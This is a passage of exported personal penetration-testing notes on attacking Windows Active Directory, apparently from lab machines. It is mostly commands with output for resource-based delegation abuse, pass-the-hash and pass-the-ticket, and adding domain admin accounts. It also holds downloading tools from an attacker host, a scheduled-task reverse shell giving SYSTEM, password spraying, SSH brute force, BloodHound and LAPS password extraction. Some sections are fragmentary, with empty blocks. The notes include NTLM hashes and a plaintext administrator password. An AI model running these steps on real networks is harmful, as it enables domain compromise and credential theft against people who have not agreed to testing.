            <codebox char_offset="186" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 10.10.10.84 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'&#13;
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Successfully added machine account ATTACK$ with password AttackerPC1!.</codebox>
            <codebox char_offset="299" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack&#13;
&#13;
&#13;
DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local&#13;
DNSHostName       :&#13;
Enabled           : True&#13;
Name              : ATTACK&#13;
ObjectClass       : computer&#13;
ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9&#13;
SamAccountName    : ATTACK$&#13;
SID               : S-1-5-21-537427935-490066102-1511301751-3601&#13;
UserPrincipalName :</codebox>
            <codebox char_offset="514" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;┌──(kali㉿kali)-[~]&#13;
└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  &#13;
...&#13;
┌──(kali㉿kali)-[~]&#13;
└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  &#13;
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$&#13;
[*] Initializing LDAP connection to 192.168.120.181&#13;
[*] Using resourced\l.livingstone account with password ***&#13;
[*] LDAP bind OK&#13;
[*] Initializing domainDumper()&#13;
[*] Initializing LDAPAttack()&#13;
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`&#13;
[*] Delegation rights modified succesfully!&#13;
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy</codebox>
            <codebox char_offset="591" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity&#13;
&#13;
Path Owner                  Access&#13;
---- -----                  ------&#13;
     BUILTIN\Administrators resourced\ATTACK$ Allow</codebox>
          </node>
          <node name="impacket-getST" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690043804" ts_lastsave="1690043838">
            <rich_text>We now need to get the administrator service ticket. We can do this by using </rich_text>
            <rich_text family="monospace">impacket-getST</rich_text>
            <rich_text> with our privileged machine account.
&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="130" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 10.10.10.84&#13;

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Getting TGT for user&#13;
[*] Impersonating Administrator&#13;
[*]     Requesting S4U2self&#13;
[*]     Requesting S4U2Proxy&#13;
[*] Saving ticket in Administrator.ccache&#13;
</codebox>
          </node>
        </node>
        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1688335472">
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

with mimikatz
</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>

</rich_text>
          <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.84 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
          <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.10.10.84 -hashes randomLMHASH:oeasdNTLMHASH</codebox>
        </node>
        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1696728088">
          <rich_text>
</rich_text>
          <rich_text scale="h2">
Setting password for user sophie</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


_______________________________________________________

&#13;• </rich_text>
          <rich_text family="monospace">Account Operators</rich_text>
          <rich_text> Group: According to official </rich_text>
          <rich_text link="webs https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators">documentation</rich_text>
          <rich_text>, members of the </rich_text>
          <rich_text family="monospace">Account Operators</rich_text>
          <rich_text> group are allowed create and modify users and add them to non-protected groups ( non admin )
&#13;• </rich_text>
          <rich_text family="monospace">WriteDACL</rich_text>
          <rich_text> : The WriteDACL privilege gives a user the ability to add ACLs to an&#13;object. This means that we can add a user to this group and give them </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync">DCSync</rich_text>
          <rich_text> privileges that can be used to abuse and grab credential and then shell via psexec
&#13;



__________________________________________________



</rich_text>
          <rich_text scale="h3">Adding a User </rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or

</rich_text>
          <rich_text scale="h3">Adding user to Admin  local group</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Or adding them to any other group

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 or with

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Then accessing the machine
_________________________________________________________
</rich_text>
          <rich_text scale="h2">curl replacement in Powershell:</rich_text>
          <rich_text>
To downoad files:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

pr
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or

</rich_text>
          <rich_text family="monospace">$WebClient = New-Object System.Net.WebClient&#13;
$WebClient.DownloadFile("</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://10.10.10.84</rich_text>
          <rich_text family="monospace">/navigating-code.exe","C:\navigating-code.exe")&#13;
</rich_text>
          <rich_text>&#13;    
or
&#13;</rich_text>
          <rich_text family="monospace">powershell.exe (New-Object System.Net.WebClient).DownloadFile('</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://10.10.10.84</rich_text>
          <rich_text family="monospace">:8080/file.bat','filename.bat')&#13;
</rich_text>
          <rich_text>&#13;    



______________________________


</rich_text>
          <rich_text scale="h2">Force any particular computer to sync its GPOs immed</rich_text>
          <rich_text justification="left" scale="h2"></rich_text>
          <rich_text scale="h2">iate</rich_text>
          <rich_text>




________________________________


</rich_text>
          <rich_text scale="h2">Use powershell specifically for all the below commands:
</rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Testing Connection/A</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3">ccess</rich_text>
          <rich_text>


____________________________________
</rich_text>
          <rich_text scale="h2">CMD</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Running as a different user on a</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3">n AD</rich_text>
          <rich_text>




_____________________________________________


</rich_text>
          <rich_text scale="h2">Powershell Remoting</rich_text>
          <rich_text>

allows you to get a Powershell session in the remote machine, listens on 5985 and is enabled by default in the Windows Server machines.
 You can use Powershell Remoting from Windows by using many </rich_text>
          <rich_text link="webs https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1">CmdLets and parameters</rich_text>
          <rich_text> available in Powershell. From a Linux machine you can use </rich_text>
          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">evil-winrm</rich_text>
          <rich_text>.
 As well as in the RPC/SMB case, you can use a password, a NT hash or a Kerberos ticket to connect to the target machine. With evil-winrm, 
 you can pass them to the application as a parameters or configure the ccache file as in impacket. 
 In case of the Powershell cmdlets, you can use a password directly, but if you have a Kerberos ticket or a NT hash, you will need to inject them by using </rich_text>
          <rich_text link="webs https://github.com/GhostPack/Rubeus">Rubeus</rich_text>
          <rich_text> or </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz">mimikatz</rich_text>
          <rich_text>.
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> Ex:
 
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> or
 
 
 
where ptt is pass the ticket
 
 th</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>en
 
 
 
 
 </rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="37" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose</codebox>
          <codebox char_offset="606" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net user john1 pass123 /add /domain</codebox>
          <codebox char_offset="647" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net localgroup administrators john1 /add</codebox>
          <codebox char_offset="685" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net group "EXCHANGE WINDOWS PERMISSIONS" john1 /add</codebox>
          <codebox char_offset="697" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net group "Exchange Windows Permissions" john1 /add /domain</codebox>
          <codebox char_offset="837" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-WebRequest http://10.10.10.84/GMSAPasswordReader.exe -OutFile GMSA.exe</codebox>
          <codebox char_offset="843" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
$wc = New-Object Net.WebClient
$wc.DownloadString("http://10.10.10.84  whatever else u want with space")
</codebox>
          <codebox char_offset="1205" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
          <codebox char_offset="1327" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
or

# Test if HTTP port is open
Test-NetConnection google.com -CommonTCPPort "Http"

# Or define a port number
Test-NetConnection google.com -Port 80</codebox>
          <codebox char_offset="1411" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"

or  like ippsec writeup

runas /netonly /user:domain.local\user cmd
</codebox>
          <codebox char_offset="2196" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
          <codebox char_offset="2206" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
          <codebox char_offset="2251" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
          <node name="Getting a Shell from password" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688943845" ts_lastsave="1688943934">
            <rich_text scale="h2">First, let's restart out Netcat listener.</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text scale="h2">
&#13;Next, we'll spawn a new PowerShell session to install and run our scheduled task using the Administrator user's credentials.</rich_text>
            <rich_text>

&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h2">&#13;Once we run the scheduled task (as shown in the final command above), we are presented with a full system shell.</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <codebox char_offset="42" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ sudo nc -lvp 445&#13;
listening on [any] 445 ...&#13;
</codebox>
            <codebox char_offset="172" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">c:\windows\system32\inetsrv&gt;powershell&#13;
powershell&#13;
Windows PowerShell &#13;
Copyright (C) Microsoft Corporation. All rights reserved.&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; $pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
SUCCESS: The scheduled task "shell" has successfully been created.&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
SUCCESS: Attempted to run the scheduled task "shell".&#13;
PS C:\windows\system32\inetsrv&gt;</codebox>
            <codebox char_offset="290" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ nc -lvp 445&#13;
listening on [any] 445 ...&#13;
192.168.120.108: inverse host lookup failed: Unknown host&#13;
connect to [192.168.118.6] from (UNKNOWN) [192.168.120.108] 49731&#13;
Microsoft Windows [Version 10.0.17763.1554]&#13;
(c) 2018 Microsoft Corporation. All rights reserved.&#13;
&#13;
C:\Windows\system32&gt;whoami&#13;
whoami&#13;
nt authority\system</codebox>
          </node>
        </node>
        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1689888826">
          <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Enumerating all the shares with a given password</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

 
</rich_text>
          <rich_text scale="h4"> Checking Pass the Hash</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> Listing all the shares</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Null Authentication smb Enumeration</rich_text>
          <rich_text>

 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 


</rich_text>
          <rich_text scale="h3">Anonymous Authentication smb Enum</rich_text>
          <rich_text>
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
 
</rich_text>
          <rich_text scale="h3">  </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h2">Checking if winrm works</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

once confirmed simply run:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
  
  
</rich_text>
          <rich_text scale="h2"> Adding Domain with -d</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
</rich_text>
          <rich_text scale="h3"> Checking all the files in the share</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> checking usernames and passwords line by line (not using all the passwords for each user)</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


or chacking all the password and continuing on success:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

____________________________________________________________________-


Grabbing the Laps password

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

______________________________


</rich_text>
          <rich_text scale="h2">SSH Brute Force</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.84</codebox>
          <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.84 -u &lt;username&gt; -p &lt;password&gt; --shares

Ex:

crackmapexec smb 10.10.10.84 -u admin -p abcd1234 --shares</codebox>
          <codebox char_offset="120" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.84 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="150" justification="left" frame_width="610" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> crackmapexec smb 10.10.10.84 --shares
 </codebox>
          <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.84 --shares -u '' -p ''</codebox>
          <codebox char_offset="231" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.84 --shares -u 'randomanon' -p ''</codebox>
          <codebox char_offset="239" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.84 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="267" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec winrm 10.10.10.84 -u users.txt -H hashes.txt</codebox>
          <codebox char_offset="297" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.84 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808</codebox>
          <codebox char_offset="328" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Crackmapexec -d domain.local -u username -p password --shares</codebox>
          <codebox char_offset="329" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
</codebox>
          <codebox char_offset="372" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.84 -u validuser.txt -p password.txt -M spider-plus </codebox>
          <codebox char_offset="373" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
          <codebox char_offset="470" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 10.10.10.84  -u validuser.txt -p password.txt -M spider-plus --no-bruteforce</codebox>
          <codebox char_offset="531" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.84  -u validuser.txt -p password.txt -M spider-plus --continue-on-success</codebox>
          <codebox char_offset="634" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ldap 10.10.10.84 -u &lt;username&gt; -p &lt;password&gt; --kdcHost 10.10.10.84 -M laps</codebox>
          <codebox char_offset="687" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.10.84 -u patrick -p /usr/share/wordlists/rockyou.txt</codebox>
        </node>
        <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1698807551">
          <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For Domain Joined simply run

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else

____________________________________________________


using Powershell to run sharphound/bloodhound on target machine

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
_______________________________________________


</rich_text>
          <rich_text scale="h3">running bloodhound from attack machine using python</rich_text>
          <rich_text>

First install via
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

then


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

OR 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



where </rich_text>
          <rich_text family="monospace">ns</rich_text>
          <rich_text> is the name server aka dns

</rich_text>
          <rich_text scale="h3">To get more infor use:</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where -c is for collection all


_________________________________________________________________________________________


</rich_text>
          <rich_text scale="h2">Running the console</rich_text>
          <rich_text>

To view all the json files generated by the commands above :

1.  Start bloodhound via : </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
2. Start neo4j console: </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
3.  Use Default password as neo4j/neo4j

4. Upload all the Json Files or drop the zip file

5. First always check the pwned users and mark them owned before checking anything else

6.Click on the left side and click on Analysis
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


7. Select : </rich_text>
          <rich_text weight="heavy">Shortest Paths to High Value Targets</rich_text>
          <rich_text>  see that view
 
8. Check the machine u have access to and see the shortest path. or path from owned users and select Domain Admin

9. click on the joining arrows, select help and then abuse to see how it can be achieved
   
</rich_text>
          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 10.10.10.84</codebox>
          <codebox char_offset="127" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe</codebox>
          <codebox char_offset="596" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">upload SharpHound.ps1&#13;
Import-Module ./SharpHound.ps1&#13;
Invoke-Bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</codebox>
          <codebox char_offset="719" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo apt install bloodhound.py</codebox>
          <codebox char_offset="729" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.10.84 -d support.htb -u 'ldap' -p 'password'</codebox>
          <codebox char_offset="737" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -c all  -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.84 -d htb.local -gc forest.htb.local</codebox>
          <codebox char_offset="803" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.10.84 -d support.htb -u 'ldap' -p 'password' -c all</codebox>
          <codebox char_offset="1042" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo bloodhound</codebox>
          <codebox char_offset="1072" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo neo4j console</codebox>
          <encoded_png char_offset="1302" justification="left" link="webs https://juggernaut-sec.com/wp-content/uploads/2022/05/8442901667a85bf701cabc4f8b9d7d3e.png"></encoded_png>
        </node>
        <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1696109791">
          <rich_text scale="h3">Using Ldapsearch</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or 

Without any user:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


once u have the output make sure u check log file for 

1.  </rich_text>
          <rich_text weight="heavy">Passwords</rich_text>
          <rich_text> via :
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
2.  </rich_text>
          <rich_text weight="heavy">Usernames</rich_text>
          <rich_text> Via:
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


_________________________________________________________________


</rich_text>
          <rich_text scale="h2">To check for admin</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -H ldap://10.10.10.84 -D ‘luser@support.htb’ -w 'password' -b 'dc=support,dc=htb'</codebox>
          <codebox char_offset="24" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -v -x -D &lt;user&gt;@HUTCH.OFFSEC -w &lt;password&gt; -b "DC=hutch,DC=offsec" -H ldap://10.10.10.84</codebox>
          <codebox char_offset="50" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://10.10.10.84 | tee ldapSearch.log  </codebox>
          <codebox char_offset="133" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat ldapSearch.log| grep -i password</codebox>
          <codebox char_offset="157" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep 'sAMAccountName:' ldapSearch.log

or

grep 'userPrincipalName:' ldapsearch/ldapSearch_Guest.log   </codebox>
          <codebox char_offset="249" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -v -x -D &lt;user&gt;@HUTCH.OFFSEC -w &lt;password&gt; -b "DC=hutch,DC=offsec" -H ldap://10.10.10.84 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd</codebox>
        </node>
